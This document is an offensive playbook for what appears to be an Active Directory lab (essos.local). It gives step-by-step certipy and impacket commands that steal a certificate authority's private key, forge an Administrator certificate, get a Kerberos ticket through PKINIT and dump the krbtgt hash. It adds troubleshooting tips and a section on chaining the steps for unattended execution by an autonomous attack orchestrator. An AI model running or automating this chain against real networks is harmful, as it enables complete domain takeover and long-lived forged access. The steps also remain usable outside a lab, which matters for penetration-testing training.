# Playbook: essos.local DA via ESC5 (Golden Certificate)

Forge an `essos.local\Administrator` certificate from the compromised ESSOS-CA
private key, exchange it for a TGT via PKINIT, then DCSync krbtgt. Bypasses the
SID-filtered cross-forest trust entirely — no inter-realm ticket, no coercion,
no kerberoast, no LDAP-over-Kerberos.

## Prerequisite

Local-admin NTLM hash for any account on the host running ESSOS-CA (currently
`braavos.essos.local`). `khal.drogo` is the canonical foothold — `certipy
shadow auto` against essos's domain controller produces an NTLM hash for
`khal.drogo`, who is local admin on braavos.

## Why this chain works

- ESSOS-CA's private key lives on a member server (braavos), not the DC. Local
  admin on the CA host is sufficient to back it up — no DA, no DCSync needed
  to reach this stage.
- The forged certificate's identity (UPN + SID) authenticates the bearer as
  `essos.local\Administrator` to the KDC. PKINIT trust is anchored on the CA
  certificate being present in `NTAuthCertificates`, which it always is for an
  Enterprise CA that has issued at least one cert.
- DRSUAPI via cross-realm referral PAC is blocked by SID filtering — but
  DRSUAPI as a same-realm DA is not. Once we hold the Administrator TGT, the
  trust is irrelevant.

## Steps

Replace `<KHAL_NT>` with khal.drogo's NTLM hash, `<DOMAIN_SID>` with the essos
domain SID (RID 500 is Administrator), and the DC/CA hostnames if the lab
moves. Run from kali-ares; each step is sub-60s.

```bash
# 1. Backup the CA's private key.
certipy ca -backup \
  -u khal.drogo@essos.local -hashes :<KHAL_NT> \
  -ca ESSOS-CA -target braavos.essos.local -dc-ip 10.4.6.159
# → ESSOS-CA.pfx (CA cert + private key)

# 2. Request a legitimate end-entity cert to use as a forge template.
#    certipy forge with only -upn/-sid produces a cert missing the EKUs and
#    other extensions the KDC requires; -template clones structure from a
#    real-issued cert. Skipping this step yields KDC_ERROR_CLIENT_NOT_TRUSTED.
certipy req \
  -u khal.drogo@essos.local -hashes :<KHAL_NT> \
  -ca ESSOS-CA -target braavos.essos.local -dc-ip 10.4.6.159 \
  -template User -out khal_legit
# → khal_legit.pfx

# 3. Forge an Administrator cert, cloning the legit cert's extension set.
certipy forge \
  -ca-pfx ESSOS-CA.pfx -template khal_legit.pfx \
  -upn administrator@essos.local \
  -subject 'CN=Administrator,CN=Users,DC=essos,DC=local' \
  -sid '<DOMAIN_SID>-500' \
  -out admin.pfx

# 4. PKINIT → Administrator TGT.
certipy auth -pfx admin.pfx -dc-ip 10.4.6.159 -domain essos.local
# → administrator.ccache
# The "Failed to extract NT hash: KDC_ERR_ETYPE_NOSUPP" line is benign — it
# means the KDC has RC4 disabled for u2u, so certipy can't recover the NT
# hash from a TGS-REP. The TGT itself was issued correctly and is usable.

# 5. DCSync krbtgt as Administrator via the TGT.
KRB5CCNAME=administrator.ccache \
  impacket-secretsdump -k -no-pass -dc-ip 10.4.6.159 \
  -just-dc-user krbtgt \
  essos.local/administrator@meereen.essos.local
```

## Verification

Step 4 succeeds when the output contains `[*] Got TGT` followed by a
`administrator.ccache` write. `klist -c administrator.ccache` should show a
TGT principal of `administrator@ESSOS.LOCAL` valid for ~10 hours.

Step 5 succeeds when secretsdump prints `krbtgt:502:aad3b435...:<NT>:::` plus
the AES256/AES128/DES key block. DA is achieved at that point — the krbtgt
hash forges golden tickets for the entire essos forest indefinitely.

## Gotchas

- **KB5014754 strong mapping** — the forged cert must carry the SID security
  extension (OID 1.3.6.1.4.1.311.25.2). `certipy forge -sid` populates it.
  Without the SID, the KDC rejects PKINIT.
- **Missing EKUs** — without `-template`, the forged cert has no
  `extendedKeyUsage`, no `keyUsage`, and no CDP/AIA pointers. PKINIT requires
  Client Authentication EKU; without it the KDC returns
  `KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)` even with a trusted CA
  signature.
- **ETYPE_NOSUPP on `certipy auth`** — KDC having RC4 disabled means certipy
  cannot recover the bearer's NT hash via u2u. This does not affect TGT
  issuance. Skip the hash retrieval, use the TGT directly via `KRB5CCNAME`.
- **One-shot foothold** — khal.drogo's NTLM is the only credential the rest
  of the chain depends on. If `auto_shadow_credentials` produces it but the
  orchestrator's result extractor doesn't persist it, the chain has no
  starting credential on the next tick.

## Autonomous execution

For the orchestrator to walk this chain unattended, the following must hold:

- `certipy shadow auto` stdout extractor wired to publish the retrieved NTLM
  into Redis as a `Hash` row.
- `auto_golden_cert` routed to a role whose toolset contains `certipy_ca`,
  `certipy_req`, `certipy_forge`, `certipy_auth`, and `impacket-secretsdump`.
  The pipeline must dispatch all five steps in sequence, not just
  forge → auth.
- Producer-side dedup on the cred-gated task queue. The certipy RPC calls
  each take 30-60s; under queue saturation they get dropped before reaching
  a worker.
